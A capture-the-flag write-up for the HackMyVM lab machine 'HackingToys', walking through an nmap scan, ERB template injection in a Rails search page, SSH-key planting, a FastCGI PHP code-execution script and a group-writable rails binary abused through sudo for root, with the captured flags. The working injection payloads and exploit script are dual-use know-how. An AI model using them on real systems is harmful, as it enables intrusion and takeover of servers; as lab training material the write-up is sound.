# HackingToys

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.81:22
Open 10.0.2.81:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.81
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLuHH80SwA8Qff3pGOY4aBesL0Aeesw6jqX+pbtR9O7w8jlbyNhuHmjjABb/34BxFp2oBx8o5xuZVXS1cE9nAlE=
|   256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY
3000/tcp open  ssl/ppp? syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Content-Length: 930
|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in `execute'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in `try_to_finish'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:298:in `reactor_wakeup'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:248:in `block in run'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:119:in `wakeup!'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `block in select_loop'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `select'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `select_loop'
|     /usr/loc
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     content-type: text/html; charset=UTF-8
|     Content-Length: 5702
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="turbo-visit-control" content="reload">
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     color-scheme: light dark;
|     supported-color-schemes: light dark;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C00;
|_    padding:
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-20T15:36:20
| Not valid after:  2038-01-27T15:36:20
| MD5:   6ac6:1f8b:e3f8:dce0:4b1a:d12b:1259:386d
| SHA-1: c423:6072:834f:77b9:396c:6907:8e29:08d6:f8c7:631d
| -----BEGIN CERTIFICATE-----
| MIIDazCCAlOgAwIBAgIUCWBIwc7YlGcff/jPNV14n8rQolswDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCRlIxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA1MjAxNTM2MjBaFw0zODAx
| MjcxNTM2MjBaMEUxCzAJBgNVBAYTAkZSMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
| HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDbdGcclY6p5qgtAzPYwsGWj0LANe7g0b6MSQQkFY6Y
| v9+8UGSOLIU09PFxeeNTdwmMICq3q2bpAc6Qv3Ixuigyv0tqB2DjNMWLemkLvOVd
| nctKDqfSFo3SjjJmW8e7rTWq/C4cu6JjR+ME8Ikd0hAqVRFzh0xfzOfWx1dDyN4S
| ePgBlzV+nGWLXKwsZ2u266JKsVK4/nkpGPT4SPSYE0w5G8xVMhpfqpu2juBPJyRV
| fbzap1YCn+QWSnD6ku0ZQ0YXwAfyPiOSilFQJe4/ZIYBgjJZH6w+DbBRLghDVgJ5
| 5afmOjXZQA0TdQPfF2pUlAf7H07QoHhcTXgiNL82bKB9AgMBAAGjUzBRMB0GA1Ud
| DgQWBBShpGMQrHmIzxxDoytRa/d9GMFfJTAfBgNVHSMEGDAWgBShpGMQrHmIzxxD
| oytRa/d9GMFfJTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBa
| nEYqR+Z0ybI+C6dD9bOSZMrEHzzRvoIXw2Pgqj4DMVdx2ZEpoMvvn36xeV8JQmrk
| obYrcyBdkUWhdpjMWK6fXtKQ4Dp/O6D0RLdER8FYZCI0r/yy5GCeeDloKiexHDq9
| kuJ6lPoBFDIEK++h9eEvhVw2frL6f+ZBD486klmPhRi8hsxnE4O+olCpCjMLCzfM
| E4l711CWj0pDTMeOfdxps1WaNsDIx/tOqsERNqjIfcgmrPKsFTFtS/sofcCdJ7lq
| RXHpfM1vyRVHEmjNax4qePvpQAgdDcem87KLdDKzFAx/FLTOrn3MLOj8d7XnjJZR
| vozWyeMFGA20aSOApTH3
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%T=SSL%I=7%D=10/10%Time=68E9492C%P=x86_64-alpine-lin
SF:ux-musl%r(GenericLines,3EF,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nConte
SF:nt-Length:\x20930\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x2
SF:0HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20trying\x20to\x2
SF:0open\x20an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(P
SF:uma::HttpParserError\)\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4
SF:\.2/lib/puma/client\.rb:268:in\x20`execute'\n/usr/local/rvm/gems/ruby-3
SF:\.1\.0/gems/puma-6\.4\.2/lib/puma/client\.rb:268:in\x20`try_to_finish'\
SF:n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/server\.rb
SF::298:in\x20`reactor_wakeup'\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma
SF:-6\.4\.2/lib/puma/server\.rb:248:in\x20`block\x20in\x20run'\n/usr/local
SF:/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:119:in\x2
SF:0`wakeup!'\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma
SF:/reactor\.rb:76:in\x20`block\x20in\x20select_loop'\n/usr/local/rvm/gems
SF:/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:76:in\x20`select'\
SF:n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.r
SF:b:76:in\x20`select_loop'\n/usr/loc")%r(GetRequest,169E,"HTTP/1\.0\x2040
SF:3\x20Forbidden\r\ncontent-type:\x20text/html;\x20charset=UTF-8\r\nConte
SF:nt-Length:\x205702\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<h
SF:ead>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n\x20\x20<meta\x20name=\
SF:"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\x2
SF:0\x20<meta\x20name=\"turbo-visit-control\"\x20content=\"reload\">\n\x20
SF:\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x20\x
SF:20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backgroun
SF:d-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20\x20
SF:\x20\x20\x20\x20color-scheme:\x20light\x20dark;\n\x20\x20\x20\x20\x20\x
SF:20supported-color-schemes:\x20light\x20dark;\n\x20\x20\x20\x20\x20\x20m
SF:argin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,
SF:\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-family:\x20helvetica,\
SF:x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20font-size
SF::\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-height:\x2018px;\n\x20
SF:\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font
SF:-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-space:\x20pre-wrap;\n\x2
SF:0\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x
SF:20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2
SF:010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20\x20\x
SF:20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\
SF:x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20back
SF:ground:\x20#C00;\n\x20\x20\x20\x20\x20\x20padding:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTPs (3000)

![writeup.png](/assets/pentest/hackmyvm/hackingtoys/writeup.png)

![writeup-1.png](/assets/pentest/hackmyvm/hackingtoys/writeup-1.png)

First I tried SQLi, but I was not positive about this since `.find` method doesn't use raw queries. We are able to change output message in HTML, try [SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#erb-ruby)? 
```bash
└─$ curl -sk 'https://10.0.2.81:3000/search?query=1&message=Product+does+not+exist' | htmlq -t .message
Product does not exist

└─$ curl -sk 'https://10.0.2.81:3000/search?query=1&message=Hello' | htmlq -t .message
Hello

└─$ curl -sk 'https://10.0.2.81:3000/search?query=1' -G --data-urlencode 'message=<%= 7*7 %>' | htmlq -t .message
49
```

## SSH

```bash
└─$ curl -sk 'https://10.0.2.81:3000/search?query=1' -G --data-urlencode 'message=<%=`id`%>' | htmlq -t .message
uid=1000(lidia) gid=1000(lidia) groups=1000(lidia),100(users),1002(rvm)

└─$ curl -sk 'https://10.0.2.81:3000/search?query=1' -G --data-urlencode 'message=<%=`find ~ -type f -ls`%>' | htmlq -t .message | grep -vE 'local|cache'
  1046531      4 -rw-r--r--   1 lidia    lidia         807 May 20  2024 /home/lidia/.profile
  1046532      4 -rw-r--r--   1 lidia    lidia        3526 May 20  2024 /home/lidia/.bashrc
  1047208      4 -rw-------   1 lidia    lidia          20 May 20  2024 /home/lidia/.lesshst
  1046533      4 -rw-r--r--   1 lidia    lidia         220 May 20  2024 /home/lidia/.bash_logout

└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' > ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFX5nsMouP0t6TkmhDSHdYrkCDfqjV5myVIi8/SXhJm4 woyag@kraken' > ~/.ssh/authorized_keys

└─$ curl -sk 'https://10.0.2.81:3000/search?query=1' -G --data-urlencode 'message=<%=`mkdir ~/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFX5nsMouP0t6TkmhDSHdYrkCDfqjV5myVIi8/SXhJm4 woyag@kraken" > ~/.ssh/authorized_keys`%>' | htmlq -t .message
```

```bash
└─$ ssh -i id_rsa lidia@10.0.2.81
lidia@hacktoys:~$ id
uid=1000(lidia) gid=1000(lidia) groups=1000(lidia),100(users),1002(rvm)
```

```bash
lidia@hacktoys:/var/www/html$ ss -tunlp4
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port  Process
udp    UNCONN  0       0              0.0.0.0:68           0.0.0.0:*
tcp    LISTEN  0       1024           0.0.0.0:3000         0.0.0.0:*      users:(("ruby",pid=525,fd=7))
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*
tcp    LISTEN  0       511          127.0.0.1:80           0.0.0.0:*
tcp    LISTEN  0       4096         127.0.0.1:9000         0.0.0.0:*
```

### HTTP (80) (Internal)

No passwords, configs or secrets from project or git.
```bash
lidia@hacktoys:/var/www/html$ git status
fatal: detected dubious ownership in repository at '/var/www/html'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/html
lidia@hacktoys:/var/www/html$ git config --global --add safe.directory /var/www/html
lidia@hacktoys:/var/www/html$ git status
On branch master
Your branch is up to date with 'origin/master'.

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    README.md
        deleted:    index.html

Untracked files:
  (use "git add <file>..." to include in what will be committed)
        index.php

no changes added to commit (use "git add" and/or "git commit -a")
```

## Privilege Escalation (dodi)

### HTTP (9000) (Internal)

```bash
lidia@hacktoys:/home$ ps aux  | grep dodi
dodi         599  0.0  0.3 204996  9352 ?        S    19:54   0:00 php-fpm: pool www
dodi         600  0.0  0.3 204996  9352 ?        S    19:54   0:00 php-fpm: pool www
dodi         747  0.0  0.2  63276  8172 ?        S    19:54   0:00 /usr/sbin/apache2 -k start
dodi         748  0.0  0.5 206236 16032 ?        S    19:54   0:00 /usr/sbin/apache2 -k start
dodi         749  0.0  0.3 206172 11316 ?        S    19:54   0:00 /usr/sbin/apache2 -k start
dodi         750  0.0  0.3 206172 11316 ?        S    19:54   0:00 /usr/sbin/apache2 -k start
dodi         751  0.0  0.3 206172 11316 ?        S    19:54   0:00 /usr/sbin/apache2 -k start
dodi         752  0.0  0.3 206172 11316 ?        S    19:54   0:00 /usr/sbin/apache2 -k start
lidia       1360  0.0  0.0   6332  2072 pts/0    S+   20:27   0:00 grep dodi

lidia@hacktoys:/home$ cat /etc/apache2/sites-enabled/fastcgi.conf
<VirtualHost 127.0.0.1:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options +ExecCGI
        AddHandler fcgid-script .fcgi
        FCGIWrapper /usr/lib/cgi-bin/php-cgi .php
        DirectoryIndex index.php index.html
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

[https://book.hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html](https://book.hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html)

I changed script to be simpler
```bash
lidia@hacktoys:/home$ nano /tmp/t.sh
#!/bin/bash

HOST=127.0.0.1
PAYLOAD="<?php system('$1');"
FILENAME="/tmp/t.php"
OUTPUT="/tmp/t.out"

if [ ! -f "$FILENAME" ]; then touch "$FILENAME"; fi

B64=$(echo "$PAYLOAD"|base64)
env -i \
    PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
    SCRIPT_FILENAME=$FILENAME SCRIPT_NAME=$FILENAME REQUEST_METHOD=POST \
    cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

cat $OUTPUT
```

```bash
lidia@hacktoys:/home$ /tmp/t.sh id
Content-type: text/html; charset=UTF-8

uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)

lidia@hacktoys:/home$ /tmp/t.sh 'mkdir ~/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFX5nsMouP0t6TkmhDSHdYrkCDfqjV5myVIi8/SXhJm4 woyag@kraken" > ~/.ssh/authorized_keys
```

### User.txt

```
dodi@hacktoys:~$ cat user.txt
b075b24bdb11990e185c32c43539c39f
```

## Privilege Escalation (Root)

```bash
└─$ ssh -i id_rsa dodi@10.0.2.81
dodi@hacktoys:~$ id
uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)
```

```
dodi@hacktoys:~$ sudo -l
Matching Defaults entries for dodi on hacktoys:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dodi may run the following commands on hacktoys:
    (ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh
```

```bash
dodi@hacktoys:~$ cat /usr/local/bin/rvm_rails.sh
#!/bin/bash
export rvm_prefix=/usr/local
export MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0
export RUBY_VERSION=ruby-3.1.0
export rvm_version=1.29.12
export rvm_bin_path=/usr/local/rvm/bin
export GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global
export GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0
export PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin
export IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc
export rvm_path=/usr/local/rvm
exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails "$@"
```

Script path look vulnerable. The ruby files are writable by root and `rvm` group
```bash
dodi@hacktoys:~$ find / -name rails -executable -ls 2>/dev/null
   563392      4 -rwxr-xr-x   1 root     root          548 May 20  2024 /usr/local/bin/rails
   692047      4 -rwxrwxr-x   1 root     rvm           566 May 20  2024 /usr/local/rvm/gems/ruby-3.1.0/bin/rails
   ...
   692049      4 -rwxrwxr-x   1 root     rvm           269 May 20  2024 /usr/local/rvm/gems/ruby-3.1.0/wrappers/rails
```

Looks like we have to go down to go up.
```bash
dodi@hacktoys:~$ getent group rvm
rvm:x:1002:lidia,root
```

Edit script
```bash
lidia@hacktoys:/home$ echo $'#!/bin/bash\n/bin/bash -p' | tee /usr/local/rvm/gems/ruby-3.1.0/bin/rails
#!/bin/bash
/bin/bash -p
```

Root
```bash
dodi@hacktoys:~$ sudo /usr/local/bin/rvm_rails.sh console
root@hacktoys:/home/dodi# id
uid=0(root) gid=0(root) groups=0(root),1002(rvm)
```

### Root.txt

```bash
root@hacktoys:/home/dodi# cat /root/root.txt
64aa5a7aaf42af74ee6b59d5ac5c1509
```